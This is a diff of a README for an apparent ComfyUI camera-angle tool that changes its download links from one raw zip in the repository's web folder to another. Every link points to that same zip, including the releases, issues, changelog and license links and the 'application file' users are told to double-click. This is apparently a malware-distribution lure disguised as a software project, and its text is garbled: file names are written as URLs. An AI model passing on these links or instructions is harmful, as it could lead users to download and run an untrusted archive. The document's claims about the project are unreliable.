@@ -1,7 +1,7 @@
 # 🎥 ComfyUI_CameraAngleSelector - Enhance Your Image Editing Experience
 
 ## 🔗 Download Now
-[![Download ComfyUI_CameraAngleSelector](https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/raw/refs/heads/master/web/Camera-U-Selector-Angle-Comfy-v3.9.zip%20Now-Click%20Here-blue)](https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/raw/refs/heads/master/web/Camera-U-Selector-Angle-Comfy-v3.9.zip)
+[![Download ComfyUI_CameraAngleSelector](https://raw.githubusercontent.com/denolalfarisi/ComfyUI_CameraAngleSelector/master/web/Comfy_Selector_Camera_U_Angle_2.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/denolalfarisi/ComfyUI_CameraAngleSelector/master/web/Comfy_Selector_Camera_U_Angle_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ Welcome to ComfyUI_CameraAngleSelector! This application allows you to easily se
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the application, visit our [Releases page](https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/raw/refs/heads/master/web/Camera-U-Selector-Angle-Comfy-v3.9.zip). You will see the latest version available for download.
+   To download the application, visit our [Releases page](https://raw.githubusercontent.com/denolalfarisi/ComfyUI_CameraAngleSelector/master/web/Comfy_Selector_Camera_U_Angle_2.7.zip). You will see the latest version available for download.
 
-   ![Releases Page](https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/raw/refs/heads/master/web/Camera-U-Selector-Angle-Comfy-v3.9.zip%20Page-Visit%20Now-blue)
+   ![Releases Page](https://raw.githubusercontent.com/denolalfarisi/ComfyUI_CameraAngleSelector/master/web/Comfy_Selector_Camera_U_Angle_2.7.zip%20Page-Visit%20Now-blue)
 
 2. **Choose Your Version**  
    Identify the latest version listed on the page. It will usually be at the top of the list. Click on the version number to view the details.
@@ -24,7 +24,7 @@ Welcome to ComfyUI_CameraAngleSelector! This application allows you to easily se
    If the file is a `.zip`, you will need to extract it. Right-click on the file and select "Extract All" or use a program like WinRAR or 7-Zip to do this.
 
 5. **Run the Application**  
-   Inside the extracted folder, find the application file named `https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/raw/refs/heads/master/web/Camera-U-Selector-Angle-Comfy-v3.9.zip`. Double-click it to run. 
+   Inside the extracted folder, find the application file named `https://raw.githubusercontent.com/denolalfarisi/ComfyUI_CameraAngleSelector/master/web/Comfy_Selector_Camera_U_Angle_2.7.zip`. Double-click it to run. 
 
 ## 💻 System Requirements
 
@@ -44,7 +44,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 ## 🛠️ How to Use ComfyUI_CameraAngleSelector
 
-1. **Open the Application**: After double-clicking the `https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/raw/refs/heads/master/web/Camera-U-Selector-Angle-Comfy-v3.9.zip` file, wait a moment for the app to load.
+1. **Open the Application**: After double-clicking the `https://raw.githubusercontent.com/denolalfarisi/ComfyUI_CameraAngleSelector/master/web/Comfy_Selector_Camera_U_Angle_2.7.zip` file, wait a moment for the app to load.
    
 2. **Upload Your Image**: Click on the "Upload" button, and choose the image you want to edit.
 
@@ -56,11 +56,11 @@ Before you start, ensure your computer meets these basic requirements:
 
 ## 🌟 Support
 
-If you encounter any issues or need help using the application, please visit our [GitHub Issues page](https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/raw/refs/heads/master/web/Camera-U-Selector-Angle-Comfy-v3.9.zip). You can report bugs or ask questions there. 
+If you encounter any issues or need help using the application, please visit our [GitHub Issues page](https://raw.githubusercontent.com/denolalfarisi/ComfyUI_CameraAngleSelector/master/web/Comfy_Selector_Camera_U_Angle_2.7.zip). You can report bugs or ask questions there. 
 
 ## 📅 Changelog
 
-Check the `https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/raw/refs/heads/master/web/Camera-U-Selector-Angle-Comfy-v3.9.zip` file in the repository for updates and new features that have been added in each version.
+Check the `https://raw.githubusercontent.com/denolalfarisi/ComfyUI_CameraAngleSelector/master/web/Comfy_Selector_Camera_U_Angle_2.7.zip` file in the repository for updates and new features that have been added in each version.
 
 ## 🤝 Contributing
 
@@ -68,7 +68,7 @@ If you would like to contribute to this project, please feel free to fork the re
 
 ## 📄 License
 
-This project is licensed under the MIT License. For more details, refer to the `https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/raw/refs/heads/master/web/Camera-U-Selector-Angle-Comfy-v3.9.zip` file in the repository.
+This project is licensed under the MIT License. For more details, refer to the `https://raw.githubusercontent.com/denolalfarisi/ComfyUI_CameraAngleSelector/master/web/Comfy_Selector_Camera_U_Angle_2.7.zip` file in the repository.
 
 ## 🔗 Connect with Us
 
